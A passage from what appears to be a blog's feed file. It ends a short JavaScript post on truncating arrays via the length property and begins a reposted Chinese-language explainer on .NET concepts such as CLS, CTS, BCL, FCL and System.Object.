<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>];  </span><br><span class="line"><span class="built_in">console</span>.log(entries.length); </span><br><span class="line"><span class="comment">// 7  </span></span><br><span class="line">entries.length = <span class="number">4</span>;  </span><br><span class="line"><span class="built_in">console</span>.log(entries.length); </span><br><span class="line"><span class="comment">// 4  </span></span><br><span class="line"><span class="built_in">console</span>.log(entries); </span><br><span class="line"><span class="comment">// [1, 2, 3, 4]</span></span><br></pre></td></tr></table></figure>

<p>如果我们要清空数组：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> entries = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]; </span><br><span class="line"><span class="built_in">console</span>.log(entries.length); </span><br><span class="line"><span class="comment">// 7  </span></span><br><span class="line">entries.length = <span class="number">0</span>;   </span><br><span class="line"><span class="built_in">console</span>.log(entries.length); </span><br><span class="line"><span class="comment">// 0 </span></span><br><span class="line"><span class="built_in">console</span>.log(entries); </span><br><span class="line"><span class="comment">// []</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1>]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> JavaScript </tag>
            
            <tag> dotNET </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[通俗易懂，什么是.NET? 什么是.NET Framework? 什么是.NET Core?]]></title>
      <url>/2019/11/28/WhatIsDotNet/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/1996V/p/9037603.html" target="_blank" rel="noopener">https://www.cnblogs.com/1996V/p/9037603.html</a></p>
</blockquote>
<p>&emsp;&emsp;什么是.NET？什么是.NET Framework?本文将从上往下，循序渐进的介绍一系列相关.NET的概念，先从类型系统开始讲起，我将通过跨语言操作这个例子来逐渐引入一系列.NET的相关概念，这主要包括：CLS、CTS(CLI)、FCL、Windows下CLR的相关核心组成、Windows下托管程序运行概念、什么是.NET Framework，.NET Core，.NET Standard及一些VS编译器相关杂项和相关阅读链接。完整的从上读到下则你可以理解个大概的.NET体系。</p>
<a id="more"></a>

<p><strong>目录</strong></p>
<ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET和C-是什么关系">.NET和C#是什么关系</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#跨语言和跨平台是什么">跨语言和跨平台是什么</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是跨语言互操作，什么是CLS">什么是跨语言互操作，什么是CLS</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#CLS异常">CLS异常</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是CTS？">什么是CTS？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是类库？">什么是类库？</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是基础类库BCL？">什么是基础类库BCL？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是框架类库FCL？">什么是框架类库FCL？</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是基元类型？">什么是基元类型？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#System-Object的意义">System.Object的意义</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#计算机是如何运行程序的？">计算机是如何运行程序的？</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是CPU">什么是CPU？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是高级编程语言">什么是高级编程语言？</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是托管代码，托管语言，托管模块？">什么是托管代码，托管语言，托管模块？</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#非托管的异常">非托管的异常</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是CLR，-NET虚拟机？">什么是CLR，.NET虚拟机？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是CLR宿主进程，运行时主机？">什么是CLR宿主进程，运行时主机？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#Windows系统自带-NET-Framework">Windows系统自带.NET Framework</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET-Framework-4-0-30319">.NET Framework 4.0.30319</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET-Framework4-X覆盖更新">.NET Framework4.X覆盖更新</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#如何确认本机安装了哪些-NET-Framework和对应CLR的版本？">如何确认本机安装了哪些.NET Framework和对应CLR的版本？</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#什么是程序集">什么是程序集</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#用csc-exe进行编译">用csc.exe进行编译</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET程序执行原理">.NET程序执行原理</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#JIT编译">JIT编译</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#AOT编译">AOT编译</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#程序集的规则">程序集的规则</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#程序集的加载方式">程序集的加载方式</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#强名称程序集">强名称程序集</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#程序集搜索规则">程序集搜索规则</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#项目的依赖顺序">项目的依赖顺序</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#为什么Newtonsoft-Json版本不一致？">为什么Newtonsoft.Json版本不一致？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#如何在编译时加载两个相同的程序集？">如何在编译时加载两个相同的程序集</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#如何同时调用两个相同命名空间和类型的程序集？">如何同时调用两个相同命名空间和类型的程序集？</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#共享程序集GAC">共享程序集GAC</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#延伸">延伸</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#应用程序域">应用程序域</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#跨边界访问">跨边界访问</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#AppDomain和AppPool">AppDomain和AppPool</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#内存">内存</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#堆栈和堆的区别">堆栈和堆的区别</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#线程堆栈">线程堆栈</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#为什么值类型存储在栈上">为什么值类型存储在栈上</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#托管堆模型">托管堆模型</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#选class还是struct">选class还是struct</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#GC管理器">GC管理器</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#弱引用、弱事件">弱引用、弱事件</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#GC堆回收">GC堆回收</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#垃圾回收对性能的影响">垃圾回收对性能的影响</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#性能建议">性能建议</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET程序执行图">.NET程序执行图</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET的安全性">.NET的安全性</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#基于角色的安全性">基于角色的安全性</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#代码访问安全性">代码访问安全性</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET是什么">什么是.NET</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET-Framework是什么">什么是.NET Framework</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#如何在VS中调试-NET-Framework源代码">如何在VS中调试.NET Framework源代码</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET-Core是什么">什么是.NET Core</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET-Standard是什么">什么是.NET Standard</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#NET官方开源项目链接">.NET官方开源项目链接</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#Visual-Studio">Visual Studio</a><ul>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#sln解决方案">sln解决方案</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#项目模板">项目模板</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#csproj工程文件">csproj工程文件</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#项目属性杂项">项目属性杂项</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#IntelliTrace智能追溯">IntelliTrace智能追溯</a></li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#链接">链接</a></li>
</ul>
</li>
<li><a href="https://tao-lol.top/2019/11/28/WhatIsDotNet/#建议">建议</a></li>
</ul>
<h1 id="NET和C-是什么关系"><a href="#NET和C-是什么关系" class="headerlink" title=".NET和C#是什么关系"></a>.NET和C#是什么关系</h1><p>&emsp;&emsp;语言，是人们进行沟通表达的主要方式。编程语言，是人与机器沟通的表达方式。不同的编程语言，其侧重点不同。有的编程语言是为了科学计算而开发的，所以其语法和功能更偏向于函数式思想。有些则是为了开发应用程序而创立的，所以其语法和功能更为均衡全面。<br>&emsp;&emsp;微软公司是全球最大的电脑软件提供商，为了占据开发者市场，进而在2002年推出了Visual Studio(简称VS，是微软提供给开发者的工具集) .NET 1.0版本的开发者平台。而为了吸引更多的开发者涌入平台，微软还在2002年宣布推出一个特性强大并且与.NET平台无缝集成的编程语言，即C# 1.0正式版。<br>&emsp;&emsp;只要是.NET支持的编程语言，开发者就可以通过.NET平台提供的工具服务和框架支持便捷的开发应用程序。<br>&emsp;&emsp;C#就是为宣传.NET而创立的，它直接集成于Visual Studio .NET中，VB也在.NET 1.0发布后对其进行支持， 所以这两门语言与.NET平台耦合度很高，并且.NET上的技术大多都是以C#编程语言为示例，所以经常就.NET和C#混为一谈(实质上它们是相辅相成的两个概念)。<br>&emsp;&emsp;而作为一个开发者平台，它不仅仅是包含开发环境、技术框架、社区论坛、服务支持等，它还强调了平台的跨语言、跨平台编程的两个特性。  </p>
<h1 id="跨语言和跨平台是什么"><a href="#跨语言和跨平台是什么" class="headerlink" title="跨语言和跨平台是什么"></a>跨语言和跨平台是什么</h1><p>&emsp;&emsp;跨语言：即只要是面向.NET平台的编程语言(C#、Visual Basic、C++/CLI、Eiffel、F#、IronPython、IronRuby、PowerBuilder、Visual COBOL 以及 Windows PowerShell)，用其中一种语言编写的类型可以无缝地用在另一种语言编写的应用程序中的互操作性。<br>&emsp;&emsp;跨平台：一次编译，不需要任何代码修改，应用程序就可以运行在任意有.NET框架实现的平台上，即代码不依赖于操作系统，也不依赖硬件环境。  </p>
<h1 id="什么是跨语言互操作，什么是CLS"><a href="#什么是跨语言互操作，什么是CLS" class="headerlink" title="什么是跨语言互操作，什么是CLS"></a>什么是跨语言互操作，什么是CLS</h1><p>&emsp;&emsp;每门语言在最初被设计时都有其在功能和语法上的定位，让不同的人使用擅长的语言去干合适的事，这在团队协作时尤为重要。<br>&emsp;&emsp;.NET平台上的跨语言是通过CLS这个概念来实现的，接下来我就以C#和VB来演示 什么是.NET中的跨语言互操作性。<br>&emsp;&emsp;通俗来说，虽然c#和vb是两个不同的语言，但此处c#写的类可以在vb中当做自家写的类一样正常使用。<br>&emsp;&emsp;比如我在vb中写了一个针对String的首字母大写的扩展方法，将其编译后的dll引用至C#项目中。<br><img src="1026815-20180626183857074-2096426398.png" alt=" "><br>&emsp;&emsp;在C#项目中，可以像自身代码一样正常使用来自vb这个dll的扩展方法。<br><img src="1026815-20180626183936496-928087425.png" alt=" "><br>&emsp;&emsp;现在有那么多面向对象语言，但不是所有编程语言都能这样直接互操作使用，而.NET平台支持的C#和VB之所以能这样无缝衔接，先读而后知，后文将会介绍缘由。不过虽然.NET平台提供了这样一个互操作的特性，但终究语言是不一样的，每个语言有其特色和差异处，在相互操作的时候就会难免遇到一些例外情况。<br>&emsp;&emsp;比如我在C#中定义了一个基类，类里面包含一个公开的指针类型的成员，我想在vb中继承这个类，并访问这个公开的成员。<br><img src="1026815-20180626184210340-127662462.png" alt=" ">  </p>
<figure class="image-box">
                <img src="1026815-20180626184235037-299865363.png" alt title class>
                <p></p>
            </figure>  
<p>&emsp;&emsp;但是vb语言因为其定位不需要指针，所以并没有C#中如int*这样的指针类型，所以在vb中访问一个该语言不支持的类型会报错的，会提示：字段的类型不受支持。<br>&emsp;&emsp;再比如，C#语言中，对类名是区分大小写的，我在C#中定义了两个类，一个叫BaseBusiness，另一个叫baseBusiness。我在vb中去继承这个BaseBusiness类。<br><img src="1026815-20180626184409472-1770998540.png" alt=" ">  </p>
<figure class="image-box">
                <img src="1026815-20180626184415319-1635326718.png" alt title class>
                <p></p>
            </figure>  
<p>&emsp;&emsp;如图，在vb中访问这个类会报错的，报:”BaseBusiness”不明确，这是因为在vb中对类名是不区分大小写的。在vb中，它认为它同时访问了两个一模一样的类，所以按照vb的规则这是不合理的。那么为了在vb调用c#的程序集中避免这些因语言的差异性而导致的错误，在编写c#代码的时候 就应该提前知道vb中的这些规则，来应付式的开发。<br>&emsp;&emsp;但是，如果我想不仅仅局限于C#和VB，我还想我编写的代码在.Net平台上通用的话，那么我还必须得知道.NET平台支持的每一种语言和我编写代码所使用的语言的差异，从而在编写代码中避免这些。<br>&emsp;&emsp;这几年编程语言层出不穷，在将来.NET可能还会支持更多的语言，如果说对一个开发者而言掌握所有语言的差异处这是不现实的，所以.NET专门为此参考每种语言并找出了语言间的共性，然后定义了一组规则，开发者都遵守这个规则来编码，那么代码就能被任意.NET平台支持的语言所通用。<br>&emsp;&emsp;而与其说是规则，不如说它是一组语言互操作的标准规范，它就是公共语言规范 - Common Language Specification ,简称CLS<br><img src="1026815-20180626184537026-621328968.png" alt=" "><br>&emsp;&emsp;CLS从类型、命名、事件、属性、数组等方面对语言进行了共性的定义及规范。这些东西被提交给欧洲计算机制造联合会ECMA，称为：共同语言基础设施。<br>&emsp;&emsp;就以类型而言，CLS定义了在C#语言中符合规范的类型和不符合的有：<br><img src="1026815-20180626190145917-2079608898.png" alt=" ">  </p>
<figure class="image-box">
                <img src="1026815-20180626190219058-1162748836.png" alt title class>
                <p></p>
            </figure>  
<p>&emsp;&emsp;当然，就编码角度而言，我们不是必须要看那些详略的文档。为了方便开发者开发，.NET提供了一个特性，名叫：<code>CLSCompliantAttribute</code>，代码被<code>CLSCompliantAttribute</code>标记后，如果你写的代码不符合CLS规范的话，编译器就会给你一条警告。<br><img src="1026815-20180626184619698-1304394925.png" alt=" "><br>&emsp;&emsp;值得一提的是，CLS规则只是面向那些公开可被其它程序集访问的成员，如<code>public</code>、继承的<code>protected</code>，对于该程序集的内部成员如<code>private</code>、<code>internal</code>则不会执行该检测规则。也就是说，所适应的CLS遵从性规则，仅是那些公开的成员，而非私有实现。<br><img src="1026815-20180626184828785-553094494.png" alt=" "><br>&emsp;&emsp;那么有没有那种特殊情况，比如我通过反射技术来访问该程序集中，当前语言并不拥有的类型时会发生什么情况呢？<br>&emsp;&emsp;答案是可以尝试的，如用vb反射访问c#中的<code>char*</code>指针类型，即使vb中没有<code>char*</code>这种等价的指针类型，但mscorlib提供了针对指针类型的 <code>Pointer</code> 包装类供其访问，可以从运行时类携带的类型名称看到其原本的类型名。<br><img src="1026815-20180626184959109-1666010143.png" alt=" "><br>&emsp;&emsp;可以看到，该类中的元素是不符合CLS规范的。  </p>
<h2 id="CLS异常"><a href="#CLS异常" class="headerlink" title="CLS异常"></a>CLS异常</h2><p>&emsp;&emsp;提到特殊情况，还要说的一点就是异常处理。.NET框架组成中定义了异常类型系统，在编译器角度，所有catch捕获的异常都必须继承自<code>System.Exception</code>，如果你要调用一个 由不遵循此规范的语言 抛出其它类型的异常对象(C++允许抛出任何类型的异常，如C#调用C++代码，C++抛出一个string类型的异常)，在C#2.0之前Catch(Exception)是捕捉不了的，但之后的版本可以。<br>&emsp;&emsp;在后续版本中，微软提供了<code>System.Runtime.CompilerServices.RuntimeWrappedException</code>异常类，将那些不符合CLS的包含Exception的对象封装起来。并且可以通过<code>RuntimeCompatibilityAttribute</code>特性来过滤这些异常。<br>&emsp;&emsp;RuntimeWrappedException ：<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.compilerservices.runtimewrappedexception?view=netframework-4.7.2" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.compilerservices.runtimewrappedexception?view=netframework-4.7.2</a>  </p>
<h2 id="那么，这个段落总结一下，什么是CLS呢？"><a href="#那么，这个段落总结一下，什么是CLS呢？" class="headerlink" title="那么，这个段落总结一下，什么是CLS呢？"></a>那么，这个段落总结一下，什么是CLS呢？</h2><p>&emsp;&emsp;在面向.NET开发中，编写跨语言组件时所遵循的那些共性，那些规范就叫做 Common Langrage Specification简称 CLS，公共语言规范<br>&emsp;&emsp;官方CLS介绍：<a href="https://docs.microsoft.com/zh-cn/dotnet/standard/language-independence-and-language-independent-components" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/standard/language-independence-and-language-independent-components</a>  </p>
<h1 id="什么是CTS？"><a href="#什么是CTS？" class="headerlink" title="什么是CTS？"></a>什么是CTS？</h1><p>&emsp;&emsp;如果理解了什么是CLS的话，那么你将很轻松理解什么是CTS。<br>&emsp;&emsp;假设你已经围绕着封装 继承 多态 这3个特性设计出了多款面向对象的语言，你发现大家都是面向对象，都能很好的将现实中的对象模型表达出来。除了语法和功能擅长不同，语言的定义和设计结构其实都差不多一回事。<br>&emsp;&emsp;比如，现实中你看到了一辆小汽车，这辆车里坐着两个人，那么如何用这门语言来表达这样的一个概念和场面？<br>&emsp;&emsp;首先要为这门语言横向定义一个“类型”的概念。接下来在程序中就可以这样表示：有一个汽车类型，有一个人类型，在一个汽车类型的对象内包含着两个人类型的对象，因为要表达出这个模型，你又引入了“对象”的概念 。而现在，你又看到，汽车里面的人做出了开车的这样一个动作，由此你又引入了“动作指令”这样一个概念。<br>&emsp;&emsp;接着，你又恍然大悟总结出一个定理，无论是什么样的“类型”，都只会存在这样一个特征，即活着的 带生命特征的(如人) 和 死的 没有生命特征的(如汽车) 这两者中的一个。最后，随着思想模型的成熟，你发现，这个“类型”就相当于一个富有主体特征的一组指令的集合。<br>&emsp;&emsp;好，然后你开始照葫芦画瓢。你参考其它程序语言，你发现大家都是用<code>class</code>来表示类的含义，用<code>struct</code>表示结构的含义，用<code>new</code>来表示 新建一个对象的含义，于是，你对这部分功能的语法也使用class和new关键字来表示。然后你又发现，他们还用很多关键字来更丰富的表示这些现实模型，比如<code>override</code>、<code>virtual</code>等。于是，在不断的思想升级和借鉴后，你对这个设计语言过程中思想的变化仔细分析，对这套语言体系给抽象归纳，最终总结出一套体系。<br>&emsp;&emsp;于是你对其它人这样说，我总结出了一门语言很多必要的东西如两种主要类别：值类别和引用类别，五个主要类型：类、接口、委托、结构、枚举，我还规定了，一个类型可以包含字段、属性、方法、事件等成员，我还指定了每种类型的可见性规则和类型成员的访问规则，等等等等，只要按照我这个体系来设计语言，设计出来的语言它能够拥有很多不错的特性，比如跨语言，跨平台等，C#和VB.net之所以能够这样就是因为这两门语言的设计符合我这个体系。  </p>
<h2 id="那么，什么是CTS呢？"><a href="#那么，什么是CTS呢？" class="headerlink" title="那么，什么是CTS呢？"></a>那么，什么是CTS呢？</h2><p>&emsp;&emsp;当你需要设计面向.Net的语言时所需要遵循一个体系(.Net平台下的语言都支持的一个体系)这个体系就是CTS（Common Type System 公共类型系统），它包括但不限于：  </p>
<ul>
<li>建立用于跨语言执行的框架。</li>
<li>提供面向对象的模型，支持在 .NET 实现上实现各种语言。 </li>
<li>定义处理类型时所有语言都必须遵守的一组规则(CLS)。 </li>
<li>提供包含应用程序开发中使用的基本基元数据类型（如 <code>Boolean</code>、<code>Byte</code>、<code>Char</code> 等）的库。  </li>
</ul>
<p>&emsp;&emsp;上文的CLS是CTS（Common Type System 公共类型系统）这个体系中的子集。<br>&emsp;&emsp;一个编程语言，如果它能够支持CTS，那么我们就称它为面向.NET平台的语言。<br>&emsp;&emsp;官方CTS介绍： <a href="https://docs.microsoft.com/zh-cn/dotnet/standard/common-type-system" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/dotnet/standard/common-type-system</a>  </p>
<blockquote>
<p>微软已经将CTS和.NET的一些其它组件，提交给ECMA以成为公开的标准，最后形成的标准称为CLI（Common Language Infrastructure）公共语言基础结构。<br>所以有的时候你见到的书籍或文章有的只提起CTS，有的只提起CLI，请不要奇怪，你可以宽泛的把他们理解成一个意思，CLI是微软将CTS等内容提交给国际组织计算机制造联合会ECMA的一个工业标准。  </p>
</blockquote>
<h1 id="什么是类库？"><a href="#什么是类库？" class="headerlink" title="什么是类库？"></a>什么是类库？</h1><p>&emsp;&emsp;在CTS中有一条就是要求基元数据类型的类库。我们先搞清什么是类库？类库就是类的逻辑集合，你开发工作中你用过或自己编写过很多工具类，比如搞Web的经常要用到的 JsonHelper、XmlHelper、HttpHelper 等等，这些类通常都会在命名为Tool、Utility等这样的项目中。 像这些类的集合我们可以在逻辑上称之为 “类库”，比如这些Helper我们统称为工具类库。  </p>
<h2 id="什么是基础类库BCL？"><a href="#什么是基础类库BCL？" class="headerlink" title="什么是基础类库BCL？"></a>什么是基础类库BCL？</h2><p>&emsp;&emsp;当你通过VS创建一个项目后，你这个项目就已经引用好了通过.NET下的语言编写好的一些类库。比如控制台中你直接就可以用<code>Console</code>类来输出信息，或者<code>using System.IO</code> 即可通过<code>File</code>类对文件进行读取或写入操作，这些类都是微软帮你写好的，不用你自己去编写，它帮你编写了一个面向.NET的开发语言中使用的基本的功能，这部分类，我们称之为BCL（Base Class Library）， 基础类库，它们大多都包含在<code>System</code>命名空间下。<br>&emsp;&emsp;基础类库BCL包含：基本数据类型，文件操作，集合，自定义属性，格式设置，安全属性，I/O流，字符串操作，事件日志等的类型  </p>
<h2 id="什么是框架类库FCL？"><a href="#什么是框架类库FCL？" class="headerlink" title="什么是框架类库FCL？"></a>什么是框架类库FCL？</h2><p>&emsp;&emsp;有关BCL的就不在此一一类举。.NET之大，发展至今，由微软帮助开发人员编写的类库越来越多，这让我们开发人员开发更加容易。由微软开发的类库统称为：FCL，Framework Class Library ，.NET框架类库，我上述所表达的BCL就是FCL中的一个基础部分，FCL中大部分类都是通过C#来编写的。<br>&emsp;&emsp;在FCL中，除了最基础的那部分BCL之外，还包含我们常见的 如 ： 用于网站开发技术的 ASP.NET类库，该子类包含webform/webpage/mvc，用于桌面开发的 WPF类库、WinForm类库，用于通信交互的WCF、asp.net web api、Web Service类库等等  </p>
<h1 id="什么是基元类型？"><a href="#什么是基元类型？" class="headerlink" title="什么是基元类型？"></a>什么是基元类型？</h1><p>&emsp;&emsp;像上文在CTS中提到了 基本基元数据类型，大家知道，每门语言都会定义一些基础的类型，比如C#通过 <code>int</code> 来定义整型，用 <code>string</code> 来定义 字符串 ，用 <code>object</code> 来定义 根类。当我们来描述这样一个类型的对象时可以有这两种写法，如图：<br><img src="1026815-20180626185607189-1458214346.png" alt=" "><br>&emsp;&emsp;我们可以看到，上边用首字母小写的蓝色体string、object能描述，用首字母大写的浅蓝色String、Object也能描述,这两种表述方式有何不同？<br>&emsp;&emsp;要知道，在vs默认的颜色方案中，蓝色体 代表关键字，浅蓝色体 代表类型。<br>&emsp;&emsp;那么这样也就意味着，由微软提供的FCL类库里面 包含了 一些用于描述数据类型的 基础类型，无论我们使用的是什么语言，只要引用了FCL，我们都可以通过new一个类的方式来表达数据类型。<br>&emsp;&emsp;如图：<br><img src="1026815-20180626185646714-1678378546.png" alt=" "><br>&emsp;&emsp;用new来创建这些类型的对象，但这样就太繁琐，所以C#就用 <code>int</code> 关键字来表示<code>System.Int32</code>，用 <code>string</code> 关键字来表示 <code>System.String</code> 等，所以我们才能这样去写。<br><img src="1026815-20180626185736390-1921725105.png" alt=" "><br>&emsp;&emsp;像这样被表述于编译器直接支持的类型叫做基元类型，它被直接映射于BCL中具体的类。<br>&emsp;&emsp;下面是部分面向.NET的语言的基元类型与对应的BCL的类别图：<br><img src="1026815-20180626190310924-274605711.png" alt=" ">  </p>
<h1 id="System-Object的意义"><a href="#System-Object的意义" class="headerlink" title="System.Object的意义"></a>System.Object的意义</h1><p>&emsp;&emsp;说起类型，这里要说CTS定义的一个非常重要的规则，就是类与类之间只能单继承，<code>System.Object</code>类是所有类型的根，任何类都是显式或隐式的继承于<code>System.Object</code>。<br>&emsp;&emsp;<code>System.Object</code>定义了类型的最基本的行为：用于实例比较的<code>Equals</code>系列方法、用于Hash表中Hash码的<code>GetHashCode</code>、用于Clr运行时获取的类型信息<code>GetType</code>、用于表示当前对象字符串的<code>ToString</code>、用于执行实例的浅复制<code>MemberwiseClone</code>、用于GC回收前操作的析构方法<code>Finalize</code> 这6类方法。<br>&emsp;&emsp;所以 Object不仅是C#语言的类型根、还是VB等所有面向.NET的语言的类型根，它是整个FCL的类型根。<br>&emsp;&emsp;当然，CTS定义了单继承，很多编程语言都满足这个规则，但也有语言是例外，如C++就不做继承限制，可以继承多个，C++/CLI作为C++在对.NET的CLI实现，如果在非托管编码中多继承那也可以，如果试图在托管代码中多继承，那就会报错。我前面已经举过这样特殊情况的例子，这也在另一方面反映出，各语言对CTS的支持并不是都如C#那样全面的，我们只需明记一点：对于符合CTS的那部分自然就按照CTS定义的规则来。 任何可遵循CTS的类型规范，同时又有.NET运行时的实现的编程语言就可以成为.NET中的一员。  </p>
<h1 id="计算机是如何运行程序的？"><a href="#计算机是如何运行程序的？" class="headerlink" title="计算机是如何运行程序的？"></a>计算机是如何运行程序的？</h1><p>&emsp;&emsp;接下来我要说什么是.NET的跨平台，并解释为什么能够跨语言。不过要想知道什么是跨平台，首先你得知道一个程序是如何在本机上运行的。  </p>
<h2 id="什么是CPU"><a href="#什么是CPU" class="headerlink" title="什么是CPU"></a>什么是CPU</h2><p>&emsp;&emsp;CPU,全称Central Processing Unit,叫做中央处理器,它是一块超大规模的集成电路，是计算机组成上必不可少的组成硬件，没了它，计算机就是个壳。<br>&emsp;&emsp;无论你编程水平怎样，你都应该先知道，CPU是一台计算机的运算核心和控制核心，CPU从存储器或高速缓冲存储器中取出指令，放入指令寄存器，并对指令译码，执行指令。<br>&emsp;&emsp;我们运行一个程序，CPU就会不断的读取程序中的指令并执行，直到关闭程序。事实上，从电脑开机开始，CPU就一直在不断的执行指令直到电脑关机。  </p>
<h2 id="什么是高级编程语言"><a href="#什么是高级编程语言" class="headerlink" title="什么是高级编程语言"></a>什么是高级编程语言</h2><p>&emsp;&emsp;在计算机角度，每一种CPU类型都有自己可以识别的一套指令集，计算机不管你这个程序是用什么语言来编写的，其最终只认其CPU能够识别的二进制指令集。<br>&emsp;&emsp;在早期计算机刚发展的时代，人们都是直接输入01010101这样的没有语义的二进制指令来让计算机工作的，可读性几乎没有，没人愿意直接编写那些没有可读性、繁琐、费时，易出差错的二进制01代码，所以后来才出现了编程语言。<br>&emsp;&emsp;编程语言的诞生，使得人们编写的代码有了可读性，有了语义，与直接用01相比，更有利于记忆。<br>&emsp;&emsp;而前面说了，计算机最终只识别二进制的指令，那么，我们用编程语言编写出来的代码就必须要转换成供机器识别的指令。<br>&emsp;&emsp;就像这样：  </p>
